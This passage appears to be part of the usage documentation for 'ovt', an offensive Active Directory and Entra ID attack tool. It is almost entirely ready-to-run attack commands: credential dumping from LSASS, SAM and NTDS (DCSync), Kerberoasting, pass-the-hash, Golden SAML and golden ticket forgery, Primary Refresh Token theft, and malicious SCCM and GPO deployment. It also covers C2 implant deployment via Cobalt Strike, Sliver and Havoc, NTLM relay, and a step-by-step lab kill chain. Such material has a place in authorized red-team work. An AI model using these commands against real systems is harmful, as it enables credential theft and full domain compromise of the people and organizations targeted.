  --sysvol "\\dc01.corp.local\SYSVOL\corp.local\Policies" \
  --command "whoami" --user-policy

# Cleanup a previously-written task
ovt gpo cleanup --gpo "Default Domain Policy" \
  --sysvol "\\dc01.corp.local\SYSVOL\corp.local\Policies"
```

| Subcommand | Flags | What it does |
|---|---|---|
| `enum` | | Enumerate all GPOs and their links |
| `write` | `--gpo`/`-g` (required), `--sysvol` (required), `--command`/`-c` (required), `--task-name` (default: `OT-Maint`), `--user-policy` | Write ImmediateTask to SYSVOL |
| `cleanup` | `--gpo`/`-g` (required), `--sysvol` (required), `--task-name` (default: `OT-Maint`), `--user-policy` | Remove previously-written task |

---

## `ovt azure` - Azure AD / Entra ID Attacks

Aliases: `ovt entra`, `ovt aad`

```bash
# Enumerate hybrid identity configuration
ovt azure enum -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Seamless SSO abuse - Kerberos ticket to Azure AD token
ovt azure seamless-sso -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Golden SAML - forge SAML assertion with ADFS cert
ovt azure golden-saml -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt azure golden-saml --upn "admin@corp.local"

# PRT theft - extract Primary Refresh Tokens from TokenBroker cache
ovt azure prt-theft -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
```

| Subcommand | Flags | What it does |
|---|---|---|
| `enum` | | Enumerate hybrid identity configuration (Azure AD Connect, SeamlessSSO, ADFS) |
| `seamless-sso` | | Seamless SSO abuse via AZUREADSSOACC$ |
| `golden-saml` | `--upn` (default: `admin@corp.local`) | Forge SAML assertion with ADFS cert |
| `prt-theft` | | Extract PRT from Windows TokenBroker cache |

---

## `ovt sccm` - SCCM/MECM Abuse

Aliases: `ovt mecm`

```bash
# Enumerate SCCM configuration
ovt sccm enum --site-server sccm01.corp.local

# Client push abuse
ovt sccm abuse --site-server sccm01.corp.local --technique client-push

# Deploy a malicious application
ovt sccm deploy --collection "All Systems" --app-name "Legit Update" --payload ./payload.exe
```

| Subcommand | Flags | What it does |
|---|---|---|
| `enum` | `--site-server`/`-s` | Enumerate SCCM configuration |
| `abuse` | `--site-server`/`-s` (required), `--technique`/`-t` (default: `client-push`) | Abuse SCCM client push/deployment |
| `deploy` | `--collection`/`-c` (required), `--app-name`/`-a` (required), `--payload`/`-P` (required) | Deploy a malicious application |

---

## `ovt module` - Built-in Module Management

List, info, run, and run-parallel for registered built-in modules.

```bash
# List all modules
ovt module list

# Filter by category
ovt module list --category dump

# Show module details
ovt module info sam-dump

# Run a module against a target
ovt module run procdump -t 10.10.10.10 --params '{"dump_path":"C:\\Windows\\Temp\\lsass.dmp"}'

# Run a module against multiple targets in parallel
ovt module run-parallel sam-dump -t 10.10.10.10,10.10.10.11 --concurrency 5
```

### Available Modules

| Module | Category | Description |
|---|---|---|
| `winrm-exec` | Execute | Remote command execution via WinRM |
| `smb-exec` | Execute | Remote command execution via SMBExec |
| `psexec` | Execute | Remote execution via PsExec |
| `wmi-exec` | Execute | Remote execution via WMI |
| `atexec` | Execute | Remote execution via Scheduled Tasks |
| `rdp` | Scan | Check if RDP (port 3389) is open |
| `procdump` | Dump | Dump LSASS via Procdump |
| `lsassy` | Dump | Credential dumping from LSASS |
| `sam-dump` | Dump | Dump SAM registry hive |
| `lsa-dump` | Dump | Dump LSA secrets |
| `ntds-dump` | Dump | DCSync NTDS.dit via MS-DRSR |
| `bloodhound` | Enum | LDAP collection for BloodHound |
| `kerberoast` | Kerberos | Kerberoast SPN accounts |
| `asreproast` | Kerberos | AS-REP roast no-preauth accounts |
| `laps` | Enum | Read LAPS passwords |
| `gpp` | Secrets | Decrypt GPP cpasswords |
| `coerce` | Coerce | Coerce authentication (MS-EFSRPC/MS-RPRN) |
| `nslookup` | Scan | DNS resolution and domain discovery |
| `zerologon` | Scan | CVE-2020-1472 check via MS-NRPC |

### Module Usage Examples

```bash
# DCSync single user (stealth)
ovt module run ntds-dump -t 10.10.10.10 --params '{"user":"krbtgt"}'

# DCSync full domain
ovt module run ntds-dump -t 10.10.10.10 --params '{"all":true}'

# Zerologon check (no creds)
ovt module run zerologon -t 10.10.10.10

# Kerberoast with NT hash
ovt --nt-hash aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
  module run kerberoast -t 10.10.10.10

# BloodHound LDAP enumeration
ovt module run bloodhound -t 10.10.10.10 --nt-hash <hash>
```

---

## `ovt c2` - C2 Framework Integration

Connect to Cobalt Strike, Sliver, or Havoc teamservers.

```bash
# Connect to Sliver (mTLS)
ovt c2 connect sliver 10.10.10.200 31337 --config ./operator.cfg

# Connect to Cobalt Strike
ovt c2 connect cs 10.10.10.200 50050 --password 'teamserver_pass'

# Connect to Havoc
ovt c2 connect havoc 10.10.10.200 40056 --token 'api_token_here'

# Named channel + skip TLS verify
ovt c2 connect sliver 10.10.10.200 31337 --config ./operator.cfg --name ops1 --skip-verify

# Check C2 status
ovt c2 status

# Execute command on a beacon/session
ovt c2 exec <session_id> "whoami /all"
ovt c2 exec <session_id> "Get-Process" --powershell

# Deploy implant to a target
ovt c2 deploy default 10.10.10.50 http-listener

# List listeners
ovt c2 listeners default

# Disconnect
ovt c2 disconnect all
```

---

## `ovt plugin` - Plugin System

Aliases: `ovt plug`

```bash
# List loaded plugins
ovt plugin list

# Plugin info
ovt plugin info smart-spray

# Execute a plugin command
ovt plugin exec spray-smart -- --targets users.txt --password 'Winter2026!'

# Load/unload plugins
ovt plugin load ./plugins/custom_scanner.wasm
ovt plugin unload custom-scanner
ovt plugin enable custom-scanner
ovt plugin disable custom-scanner
```

---

## `ovt report` - Engagement Reporting

Turn carnage into compliance documents.

```bash
# Markdown report
ovt report --input engagement.json --output report.md --format markdown

# JSON report
ovt report --input engagement.json --output findings.json --format json

# PDF report
ovt report --input engagement.json --output executive.pdf --format pdf
```

| Flag | Default | What it does |
|---|---|---|
| `--input` | `engagement.json` | Input engagement state file |
| `--output`, `-o` | `report.md` | Output report file |
| `--format`, `-F` | `markdown` | `markdown`, `pdf`, `json` |

---

## `ovt doctor` - Environment Diagnostics

Aliases: `ovt check`, `ovt env`

Check dependencies, connectivity, and environment before an engagement.

```bash
# Run all checks
ovt doctor

# Specific checks with target DC
ovt doctor --checks smb,kerberos,winrm,network --target-dc 10.10.10.1
```

| Flag | Default | What it does |
|---|---|---|
| `--checks`, `-c` | all | Comma-separated: `smb`, `kerberos`, `winrm`, `network` |
| `--target-dc` | none | DC to test connectivity against |

---

## `ovt tui` - Interactive Terminal UI

Aliases: `ovt ui`

Launch the full TUI with live attack graph visualization, session panels, and crawler.

```bash
# Start TUI with domain crawl
ovt tui --domain corp.local -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Load a previous graph without crawling
ovt tui --domain corp.local --load graph.json --crawl false
```

| Flag | Default | What it does |
|---|---|---|
| `--domain`, `-d` | required | Domain to crawl |
| `--crawl`, `-c` | `true` | Start crawler automatically |
| `--load`, `-l` | none | Load graph from previous JSON export |

---

## `ovt completions` - Shell Tab Completion

Aliases: `ovt completion`

```bash
# Print completion script to stdout
ovt completions bash
ovt completions fish
ovt completions zsh
ovt completions powershell
ovt completions elvish

# Write directly to a file
ovt completions bash --output ~/.bash_completion.d/ovt.bash
ovt completions zsh --output ~/.zsh/completions/_ovt

# Quick setup (bash)
ovt completions bash >> ~/.bashrc && source ~/.bashrc

# Quick setup (zsh)
ovt completions zsh > "$(brew --prefix)/share/zsh/site-functions/_ovt" && compinit

# Quick setup (fish)
ovt completions fish > ~/.config/fish/completions/ovt.fish

# Quick setup (PowerShell)
ovt completions powershell >> $PROFILE
```

| Flag | What it does |
|---|---|
| `<shell>` (required) | One of: `bash`, `fish`, `zsh`, `powershell`, `elvish` |
| `--output`, `-o` | Write script to file instead of stdout |

---

## Quick Reference Card

```bash
# === RECON ===
ovt scan --targets DC                                  # No-creds port/null-session triage
ovt enum pre -H DC                                     # No-creds AD service triage
ovt enum anonymous -H DC                               # Anonymous LDAP RootDSE probe
ovt enum null-session -H DC                            # Null-session RID range probe
ovt enum all -H DC -d DOMAIN -u USER -p PASS           # Enumerate everything
ovt reaper -H DC -d DOMAIN -u USER -p PASS             # Full LDAP reaper
ovt rid -H DC --null-session                           # RID cycling no-creds

# === KERBEROS ===
ovt kerberos roast -H DC -d DOMAIN -u USER -p PASS     # Kerberoast
ovt kerberos asrep-roast -H DC -d DOMAIN -u USER       # AS-REP Roast
ovt kerberos get-tgt -H DC -d DOMAIN -u USER -p PASS   # Get TGT
ovt kerberos user-enum -H DC -d DOMAIN                 # Zero-knowledge user enum
ovt crack --file hashes.txt --mode thorough            # Crack offline

# === CERTS ===
ovt adcs enum -H DC -d DOMAIN -u USER -p PASS          # Find vulnerable templates
ovt adcs esc1 --ca CA --template TPL --target-user DA   # ESC1 exploit

# === LATERAL ===
ovt exec -t TARGET -c "whoami" -d DOMAIN -u ADMIN       # Remote exec
ovt shell -t TARGET -d DOMAIN -u ADMIN -p PASS          # Interactive shell
ovt smb admin --targets 10.10.10.0/24                   # Admin check

# === LOOT ===
ovt dump -t DC ntds -d DOMAIN -u DA -p PASS             # Dump NTDS
ovt forge golden --krbtgt-hash HASH --domain-sid SID    # Golden ticket
ovt laps -H DC -d DOMAIN -u USER -p PASS                # Read LAPS

# === ACL & GPO ABUSE ===
ovt acl force-password -t jdoe -p 'NewPass!'            # Force password change
ovt acl add-member -g "CN=Domain Admins,..." -m "CN=..." # Add to group
ovt gpo write -g "Default Policy" --sysvol <path> -c cmd # GPO ImmediateTask

# === AZURE / ENTRA ===
ovt azure enum -H DC -d DOMAIN -u USER -p PASS          # Hybrid identity enum
ovt azure golden-saml -H DC -d DOMAIN -u USER -p PASS   # Golden SAML forge

# === AUTOPWN ===
ovt wizard -t DA --dc-host DC -d DOMAIN -u USER          # Guided mode

# === NTLM RELAY ===
ovt ntlm capture --interface eth0                        # Capture hashes
ovt ntlm relay --targets TARGET:445                      # Relay to target

# === MISC ===
ovt doctor                                                # Health check
ovt report -o report.pdf --format pdf                     # Generate report
ovt tui --domain DOMAIN                                   # Launch TUI
ovt module run zerologon -t DC                            # Zerologon check
```

---

## VulnAD Quick-Start

For the VulnAD lab environment.

```
Kali (attacker)        : 192.168.6.20
WS2025 DC (dc01)       : 192.168.6.10
WS2025 Member (ws01)   : 192.168.5.145
```

### Pre-configured

A TOML config ships at `configs/vulnad.toml`:

```bash
ovt wizard --config configs/vulnad.toml
```

### Manual commands

```bash
# Phase 1: Recon (no creds needed first)
ovt enum pre -H 192.168.6.10
ovt enum anonymous -H 192.168.6.10

# Phase 2: Full enumeration (with creds)
ovt enum all -H 192.168.6.10 -d vulnad.local -u <user> -p '<pass>'

# Phase 3: Kerberoast
ovt kerberos roast -H 192.168.6.10 -d vulnad.local -u <user> -p '<pass>'

# Phase 4: Crack hashes
ovt crack --file ./loot/kerberoast_hashes.txt --mode thorough

# Phase 5: Lateral to member server
ovt exec -t 192.168.5.145 -c "whoami /all" -d vulnad.local -u <user> -p '<pass>'

# Phase 6: DCSync (if you got DA)
ovt dump -t 192.168.6.10 ntds -d vulnad.local -u <da_user> -p '<da_pass>'

# Phase 7: Report
ovt report --format pdf --output vulnad-report.pdf
```


